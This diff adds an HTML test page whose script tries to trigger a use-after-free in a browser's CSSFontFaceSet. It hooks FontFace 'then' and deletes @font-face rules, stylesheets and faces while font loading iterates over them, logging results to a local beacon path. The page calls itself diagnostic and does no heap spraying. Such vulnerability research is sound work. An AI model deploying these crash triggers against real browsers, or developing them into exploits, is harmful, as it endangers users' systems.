@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>CSSFontFaceSet reference_wrapper UAF Diagnostic (V920)</title>
+</head>
+<body><pre id="out">CSSFontFaceSet reference_wrapper UAF diagnostic running...</pre>
+<script>
+/* V920: CSSFontFaceSet reference_wrapper UAF diagnostic probe.
+ * Tests whether mutating @font-face rules during FontFaceSet iteration
+ * (via document.fonts.load/check/matchingFacesExcludingPreinstalledFonts)
+ * triggers a use-after-free or other renderer crash.
+ *
+ * This probe is READ-ONLY and DIAGNOSTIC. It does NOT:
+ * - spray the heap to reclaim freed CSSFontFace objects,
+ * - forge reference counts or vtables,
+ * - read controlled memory as an exploit primitive.
+ * It only observes crashes and JavaScript-visible behavior.
+ *
+ * Beacon prefix: V920-
+ */
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function bks(tag, body) {
+  var u = '/beacon/V920-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function summarize(obj) {
+  try { return JSON.stringify(obj); } catch (e) { return String(obj); }
+}
+
+function sleep(ms) { return new Promise(function (resolve) { setTimeout(resolve, ms); }); }
+
+/* ---- Test 1: load() while deleting rules inside FontFace load promise ---- */
+async function testLoadDeletePromise() {
+  var r = {};
+  try {
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+
+    // Create several @font-face rules
+    for (var i = 0; i < 10; i++) {
+      style.sheet.insertRule('@font-face { font-family: f' + i + '; src: local(Helvetica); unicode-range: U+00' + (0x41 + i) + '; }', 0);
+    }
+
+    // Create a FontFace and hook its promise resolution
+    var ff = new FontFace('hookface', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(ff);
+
+    var oldThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        // During load iteration, delete all CSS rules
+        try {
+          while (style.sheet.cssRules.length) style.sheet.deleteRule(0);
+          document.body.offsetTop; // force recalc
+          r.deleted = style.sheet.cssRules.length;
+        } catch (e) {
+          r.deleteErr = e.constructor.name;
+        }
+        return undefined;
+      }
+    });
+
+    try {
+      var fonts = await document.fonts.load('1em hookface, f0, f1, f2, f3, f4', 'ABCDE');
+      r.fontsLoaded = fonts.length;
+    } catch (e) {
+      r.loadErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+    }
+
+    // Restore
+    if (oldThen) Object.defineProperty(FontFace.prototype, 'then', oldThen);
+    else delete FontFace.prototype.then;
+
+    style.remove();
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 2: check() while deleting rules inside promise ---- */
+async function testCheckDeletePromise() {
+  var r = {};
+  try {
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+    for (var i = 0; i < 10; i++) {
+      style.sheet.insertRule('@font-face { font-family: g' + i + '; src: local(Helvetica); unicode-range: U+00' + (0x41 + i) + '; }', 0);
+    }
+
+    var ff = new FontFace('hookface2', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(ff);
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        try {
+          while (style.sheet.cssRules.length) style.sheet.deleteRule(0);
+          document.body.offsetTop;
+          r.deleted = style.sheet.cssRules.length;
+        } catch (e) {
+          r.deleteErr = e.constructor.name;
+        }
+        return undefined;
+      }
+    });
+
+    try {
+      var ok = await document.fonts.check('1em hookface2, g0, g1, g2, g3, g4', 'ABCDE');
+      r.checkResult = ok;
+    } catch (e) {
+      r.checkErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+    }
+
+    delete FontFace.prototype.then;
+    style.remove();
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 3: matchingFacesExcludingPreinstalledFonts via style mutation ---- */
+async function testStyleMutation() {
+  var r = {};
+  try {
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+    for (var i = 0; i < 20; i++) {
+      style.sheet.insertRule('@font-face { font-family: h' + i + '; src: local(Helvetica); }', 0);
+    }
+
+    // Force layout to instantiate faces
+    document.body.offsetTop;
+
+    var ff = new FontFace('hookface3', 'local(Helvetica)');
+    document.fonts.add(ff);
+
+    var triggered = 0;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        triggered++;
+        // Remove style entirely during iteration
+        try {
+          style.remove();
+          document.body.offsetTop;
+          r.styleRemoved = 1;
+        } catch (e) {
+          r.removeErr = e.constructor.name;
+        }
+        return undefined;
+      }
+    });
+
+    try {
+      var fonts = await document.fonts.load('1em hookface3, h0, h1, h2', 'ABC');
+      r.fontsLoaded = fonts.length;
+    } catch (e) {
+      r.loadErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+    }
+
+    r.triggered = triggered;
+    delete FontFace.prototype.then;
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 4: rapid add/delete faces during load ---- */
+async function testRapidAddDelete() {
+  var r = {};
+  try {
+    var faces = [];
+    for (var i = 0; i < 20; i++) {
+      var ff = new FontFace('rapid' + i, 'local(Helvetica)');
+      document.fonts.add(ff);
+      faces.push(ff);
+    }
+
+    var ff = new FontFace('rapid-hook', 'local(Helvetica)');
+    document.fonts.add(ff);
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        try {
+          for (var i = 0; i < faces.length; i++) {
+            document.fonts.delete(faces[i]);
+          }
+          document.body.offsetTop;
+          r.deletedCount = faces.length;
+        } catch (e) {
+          r.deleteErr = e.constructor.name;
+        }
+        return undefined;
+      }
+    });
+
+    try {
+      var fonts = await document.fonts.load('1em rapid-hook, rapid0, rapid1, rapid2', 'ABC');
+      r.fontsLoaded = fonts.length;
+    } catch (e) {
+      r.loadErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+    }
+
+    delete FontFace.prototype.then;
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 5: CSSFontFaceSet load without thenable hook (baseline) ---- */
+async function testBaseline() {
+  var r = {};
+  try {
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+    for (var i = 0; i < 5; i++) {
+      style.sheet.insertRule('@font-face { font-family: base' + i + '; src: local(Helvetica); }', 0);
+    }
+    document.body.offsetTop;
+
+    var fonts = await document.fonts.load('1em base0, base1, base2', 'ABC');
+    r.fontsLoaded = fonts.length;
+    style.remove();
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Run all tests sequentially ---- */
+async function runAll() {
+  bks('BOOT', 'cssfontface-ref-wrapper-v1');
+  var tests = [
+    { name: 'BASELINE', fn: testBaseline },
+    { name: 'LOADDELETE', fn: testLoadDeletePromise },
+    { name: 'CHECKDELETE', fn: testCheckDeletePromise },
+    { name: 'STYLEMUTATION', fn: testStyleMutation },
+    { name: 'RAPIDADDDELETE', fn: testRapidAddDelete }
+  ];
+  for (var i = 0; i < tests.length; i++) {
+    bks(tests[i].name + '-PRE', 'start');
+    try {
+      var result = await tests[i].fn();
+      bks(tests[i].name, summarize(result));
+      say(tests[i].name + ': ' + summarize(result));
+    } catch (e) {
+      bks(tests[i].name + '-FATAL', e.constructor.name + ':' + String(e.message || '').slice(0, 80));
+      say(tests[i].name + ' FATAL: ' + e.constructor.name);
+    }
+    await sleep(300);
+  }
+  bks('DONE', 'all-' + tests.length);
+  say('DONE');
+}
+runAll();
+</script>
+</body>
+</html>
